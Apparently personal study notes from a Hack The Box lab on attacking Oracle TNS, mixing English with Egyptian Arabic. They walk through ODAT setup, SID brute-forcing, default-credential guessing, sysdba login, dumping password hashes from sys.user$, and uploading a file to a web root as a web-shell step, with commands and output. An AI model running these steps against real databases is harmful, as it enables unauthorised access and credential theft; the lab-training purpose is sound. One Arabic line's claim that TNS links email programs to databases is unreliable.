*- The `Oracle Transparent Network Substrate` (`TNS`) server is a communication protocol that facilitates communication between Oracle databases and applications over networks
- the listener listens for incoming connections on the `TCP/1521` port
- الTNS ده جزء من نظام قواعد البيانات بتاع شركة Oracle. باختصار، هو اللي بيخلي برامج الإيميلات تتكلم مع قواعد البيانات دي عن طريق الشبكة
---
## Default Configuration
- **tnsnames.ora:** ده ملف على جهاز الكمبيوتر بتاع العميل. بيعرف العميل إزاي يوصل لقاعدة البيانات، زي عنوانها ورقم الباب. كل قاعدة بيانات ليها اسم فريد (زي `ORCL` في المثال).
- **listener.ora:** ده ملف على السيرفر نفسه. بيحدد للسيرفر إنه يسمع على أي أبواب ويستقبل أي طلبات
#### Tnsnames.ora

```txt
ORCL =
  (DESCRIPTION =
    (ADDRESS_LIST =
      (ADDRESS = (PROTOCOL = TCP)(HOST = 10.129.11.102)(PORT = 1521))
    )
    (CONNECT_DATA =
      (SERVER = DEDICATED)
      (SERVICE_NAME = orcl)
    )
  )
```
#### Listener.ora

```txt
SID_LIST_LISTENER =
  (SID_LIST =
    (SID_DESC =
      (SID_NAME = PDB1)
      (ORACLE_HOME = C:\oracle\product\19.0.0\dbhome_1)
      (GLOBAL_DBNAME = PDB1)
      (SID_DIRECTORY_LIST =
        (SID_DIRECTORY =
          (DIRECTORY_TYPE = TNS_ADMIN)
          (DIRECTORY = C:\oracle\product\19.0.0\dbhome_1\network\admin)
        )
      )
    )
  )

LISTENER =
  (DESCRIPTION_LIST =
    (DESCRIPTION =
      (ADDRESS = (PROTOCOL = TCP)(HOST = orcl.inlanefreight.htb)(PORT = 1521))
      (ADDRESS = (PROTOCOL = IPC)(KEY = EXTPROC1521))
    )
  )

ADR_BASE_LISTENER = C:\oracle
```

| **Setting**          | **Description**                                                                                                          |
| -------------------- | ------------------------------------------------------------------------------------------------------------------------ |
| `DESCRIPTION`        | A descriptor that provides a name for the database and its connection type.                                              |
| `ADDRESS`            | The network address of the database, which includes the hostname and port number.                                        |
| `PROTOCOL`           | The network protocol used for communication with the server                                                              |
| `PORT`               | The port number used for communication with the server                                                                   |
| `CONNECT_DATA`       | Specifies the attributes of the connection, such as the service name or SID, protocol, and database instance identifier. |
| `INSTANCE_NAME`      | The name of the database instance the client wants to connect.                                                           |
| `SERVICE_NAME`       | The name of the service that the client wants to connect to.                                                             |
| `SERVER`             | The type of server used for the database connection, such as dedicated or shared.                                        |
| `USER`               | The username used to authenticate with the database server.                                                              |
| `PASSWORD`           | The password used to authenticate with the database server.                                                              |
| `SECURITY`           | The type of security for the connection.                                                                                 |
| `VALIDATE_CERT`      | Whether to validate the certificate using SSL/TLS.                                                                       |
| `SSL_VERSION`        | The version of SSL/TLS to use for the connection.                                                                        |
| `CONNECT_TIMEOUT`    | The time limit in seconds for the client to establish a connection to the database.                                      |
| `RECEIVE_TIMEOUT`    | The time limit in seconds for the client to receive a response from the database.                                        |
| `SEND_TIMEOUT`       | The time limit in seconds for the client to send a request to the database.                                              |
| `SQLNET.EXPIRE_TIME` | The time limit in seconds for the client to detect a connection has failed.                                              |
| `TRACE_LEVEL`        | The level of tracing for the database connection.                                                                        |
| `TRACE_DIRECTORY`    | The directory where the trace files are stored.                                                                          |
| `TRACE_FILE_NAME`    | The name of the trace file.                                                                                              |
| `LOG_FILE`           | The file where the log information is stored.                                                                            |
#### Setting up

```shell-session
0xTroj6n@htb[/htb]$ wget https://download.oracle.com/otn_software/linux/instantclient/214000/instantclient-basic-linux.x64-21.4.0.0.0dbru.zip
wget https://download.oracle.com/otn_software/linux/instantclient/214000/instantclient-sqlplus-linux.x64-21.4.0.0.0dbru.zip
sudo mkdir -p /opt/oracle
sudo unzip -d /opt/oracle instantclient-basic-linux.x64-21.4.0.0.0dbru.zip
sudo unzip -d /opt/oracle instantclient-sqlplus-linux.x64-21.4.0.0.0dbru.zip
export LD_LIBRARY_PATH=/opt/oracle/instantclient_21_4:$LD_LIBRARY_PATH
export PATH=$LD_LIBRARY_PATH:$PATH
source ~/.bashrc
cd ~
git clone https://github.com/quentinhardy/odat.git
cd odat/
pip install python-libnmap
git submodule init
git submodule update
pip3 install cx_Oracle
sudo apt-get install python3-scapy -y
sudo pip3 install colorlog termcolor passlib python-libnmap
sudo apt-get install build-essential libgmp-dev -y
pip3 install pycryptodome

--2025-06-24 00:24:53--  https://download.oracle.com/otn_software/linux/instantclient/214000/instantclient-basic-linux.x64-21.4.0.0.0dbru.zip
Resolving download.oracle.com (download.oracle.com)... 23.58.104.121
Connecting to download.oracle.com (download.oracle.com)|23.58.104.121|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 79386308 (76M) [application/zip]
Saving to: ‘instantclient-basic-linux.x64-21.4.0.0.0dbru.zip’

<SNIP>
```
#### Testing ODAT

```shell-session
0xTroj6n@htb[/htb]$ ./odat.py -h

usage: odat.py [-h] [--version]
               {all,tnscmd,tnspoison,sidguesser,snguesser,passwordguesser,utlhttp,httpuritype,utltcp,ctxsys,externaltable,dbmsxslprocessor,dbmsadvisor,utlfile,dbmsscheduler,java,passwordstealer,oradbg,dbmslob,stealremotepwds,userlikepwd,smb,privesc,cve,search,unwrapper,clean}
               ...

            _  __   _  ___ 
           / \|  \ / \|_ _|
          ( o ) o ) o || | 
           \_/|__/|_n_||_| 
-------------------------------------------
  _        __           _           ___ 
 / \      |  \         / \         |_ _|
( o )       o )         o |         | | 
 \_/racle |__/atabase |_n_|ttacking |_|ool 
-------------------------------------------

By Quentin Hardy (quentin.hardy@protonmail.com or quentin.hardy@bt.com)
...SNIP...
```
Oracle Database Attacking Tool (`ODAT`) is an open-source penetration testing tool written in Python and designed to enumerate and exploit vulnerabilities in Oracle databases

---
## Footprinting the Service
#### Nmap

```shell-session
0xTroj6n@htb[/htb]$ sudo nmap -p1521 -sV 10.129.204.235 --open

Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-06 10:59 EST
Nmap scan report for 10.129.204.235
Host is up (0.0041s latency).

PORT     STATE SERVICE    VERSION
1521/tcp open  oracle-tns Oracle TNS listener 11.2.0.2.0 (unauthorized)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.64 seconds
```
#### Nmap - SID Bruteforcing

```shell-session
0xTroj6n@htb[/htb]$ sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute

Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-06 11:01 EST
Nmap scan report for 10.129.204.235
Host is up (0.0044s latency).

PORT     STATE SERVICE    VERSION
1521/tcp open  oracle-tns Oracle TNS listener 11.2.0.2.0 (unauthorized)
| oracle-sid-brute: 
|_  XE

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 55.40 seconds
```
#### ODAT

```shell-session
0xTroj6n@htb[/htb]$ ./odat.py all -s 10.129.204.235

[+] Checking if target 10.129.204.235:1521 is well configured for a connection...
[+] According to a test, the TNS listener 10.129.204.235:1521 is well configured. Continue...

...SNIP...

[!] Notice: 'mdsys' account is locked, so skipping this username for password           #####################| ETA:  00:01:16 
[!] Notice: 'oracle_ocm' account is locked, so skipping this username for password       #####################| ETA:  00:01:05 
[!] Notice: 'outln' account is locked, so skipping this username for password           #####################| ETA:  00:00:59
[+] Valid credentials found: scott/tiger. Continue...

...SNIP...
```
#### SQLplus - Log In

```shell-session
0xTroj6n@htb[/htb]$ sqlplus scott/tiger@10.129.204.235/XE

SQL*Plus: Release 21.0.0.0.0 - Production on Mon Mar 6 11:19:21 2023
Version 21.4.0.0.0

Copyright (c) 1982, 2021, Oracle. All rights reserved.

ERROR:
ORA-28002: the password will expire within 7 days



Connected to:
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production

SQL> 
```

#### Oracle RDBMS - Interaction

```shell-session
SQL> select table_name from all_tables;

TABLE_NAME
------------------------------
DUAL
SYSTEM_PRIVILEGE_MAP
TABLE_PRIVILEGE_MAP
STMT_AUDIT_OPTION_MAP
AUDIT_ACTIONS
WRR$_REPLAY_CALL_FILTER
HS_BULKLOAD_VIEW_OBJ
HS$_PARALLEL_METADATA
HS_PARTITION_COL_NAME
HS_PARTITION_COL_TYPE
HELP

...SNIP...


SQL> select * from user_role_privs;

USERNAME                       GRANTED_ROLE                   ADM DEF OS_
------------------------------ ------------------------------ --- --- ---
SCOTT                          CONNECT                        NO  YES NO
SCOTT                          RESOURCE                       NO  YES NO
```

Here, the user `scott` has no administrative privileges. However, we can try using this account to log in as the System Database Admin (`sysdba`), giving us higher privileges. This is possible when the user `scott` has the appropriate privileges typically granted by the database administrator or used by the administrator him/herself.

#### Oracle RDBMS - Database Enumeration

```shell-session
0xTroj6n@htb[/htb]$ sqlplus scott/tiger@10.129.204.235/XE as sysdba

SQL*Plus: Release 21.0.0.0.0 - Production on Mon Mar 6 11:32:58 2023
Version 21.4.0.0.0

Copyright (c) 1982, 2021, Oracle. All rights reserved.


Connected to:
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production


SQL> select * from user_role_privs;

USERNAME                       GRANTED_ROLE                   ADM DEF OS_
------------------------------ ------------------------------ --- --- ---
SYS                            ADM_PARALLEL_EXECUTE_TASK      YES YES NO
SYS                            APEX_ADMINISTRATOR_ROLE        YES YES NO
SYS                            AQ_ADMINISTRATOR_ROLE          YES YES NO
SYS                            AQ_USER_ROLE                   YES YES NO
SYS                            AUTHENTICATEDUSER              YES YES NO
SYS                            CONNECT                        YES YES NO
SYS                            CTXAPP                         YES YES NO
SYS                            DATAPUMP_EXP_FULL_DATABASE     YES YES NO
SYS                            DATAPUMP_IMP_FULL_DATABASE     YES YES NO
SYS                            DBA                            YES YES NO
SYS                            DBFS_ROLE                      YES YES NO

USERNAME                       GRANTED_ROLE                   ADM DEF OS_
------------------------------ ------------------------------ --- --- ---
SYS                            DELETE_CATALOG_ROLE            YES YES NO
SYS                            EXECUTE_CATALOG_ROLE           YES YES NO
...SNIP...
```
#### Oracle RDBMS - Extract Password Hashes

```shell-session
SQL> select name, password from sys.user$;

NAME                           PASSWORD
------------------------------ ------------------------------
SYS                            FBA343E7D6C8BC9D
PUBLIC
CONNECT
RESOURCE
DBA
SYSTEM                         B5073FE1DE351687
SELECT_CATALOG_ROLE
EXECUTE_CATALOG_ROLE
DELETE_CATALOG_ROLE
OUTLN                          4A3BA55E08595C81
EXP_FULL_DATABASE

NAME                           PASSWORD
------------------------------ ------------------------------
IMP_FULL_DATABASE
LOGSTDBY_ADMINISTRATOR
...SNIP...
```

Another option is to upload a web shell to the target. However, this requires the server to run a web server, and we need to know the exact location of the root directory for the webserver. Nevertheless, if we know what type of system we are dealing with, we can try the default paths, which are:

|**OS**|**Path**|
|---|---|
|Linux|`/var/www/html`|
|Windows|`C:\inetpub\wwwroot`|

#### Oracle RDBMS - File Upload

```shell-session
0xTroj6n@htb[/htb]$ echo "Oracle File Upload Test" > testing.txt
0xTroj6n@htb[/htb]$ ./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt

[1] (10.129.204.235:1521): Put the ./testing.txt local file in the C:\inetpub\wwwroot folder like testing.txt on the 10.129.204.235 server                                                                                                  
[+] The ./testing.txt file was created on the C:\inetpub\wwwroot directory on the 10.129.204.235 server like the testing.txt file
```

Finally, we can test if the file upload approach worked with `curl`. Therefore, we will use a `GET http://<IP>` request, or we can visit via browser.

```shell-session
0xTroj6n@htb[/htb]$ curl -X GET http://10.129.204.235/testing.txt

Oracle File Upload Test
```